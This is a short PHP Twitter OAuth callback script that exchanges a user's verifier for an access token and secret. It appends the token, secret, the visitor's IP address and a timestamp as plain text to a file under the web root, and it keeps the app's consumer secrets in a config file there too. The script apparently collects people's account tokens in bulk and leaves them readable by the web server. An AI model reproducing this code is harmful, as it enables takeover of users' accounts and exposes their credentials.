<!-- made by monarch60 -->
<?php

session_start();

require "vendor/autoload.php";

use Abraham\TwitterOAuth\TwitterOAuth;

function get_config( $int1) {
    $configContent = file_get_contents("/var/www/html/auth.config");
    if ($configContent === false) {
        return null;
    }
    $list1 = explode("\n", trim($configContent));
    if (count($list1) < $int1) {
        return null;
    }
    $substring = $list1[$int1 - 1];
    $array2 = explode("\t", $substring);
    if (empty($array2)) {
        return null;
    }
    
    return array_pop($array2);
}
$consumerKey = get_config(1);
$consumerSecret = get_config(2);

$oauthToken = $_SESSION['oauth_token'];
$oauthTokenSecret = $_SESSION['oauth_token_secret'];

if (!isset($_GET['oauth_token']) || !isset($_GET['oauth_verifier'])) {
    header('Location: pages/error.php');
    exit;
}

if ($_GET['oauth_token'] !== $oauthToken) {
    header('Location: pages/error.php');
    exit;
}

$twitterOAuth = new TwitterOAuth($consumerKey, $consumerSecret, $oauthToken, $oauthTokenSecret);

$accessToken = $twitterOAuth->oauth('oauth/access_token', array('oauth_verifier' => $_GET['oauth_verifier']));

$userIP = $_SERVER['REMOTE_ADDR'];

$tokensData = $accessToken['oauth_token'] . '|' . $accessToken['oauth_token_secret'] . '| IP: ' . $userIP ." AT: ".date("Y-m-d h:i:sa", strtotime("now")). PHP_EOL;
file_put_contents('/var/www/html/data/tokens.temp', $tokensData, FILE_APPEND | LOCK_EX);
header('Location: pages/success.php');
exit;

?>
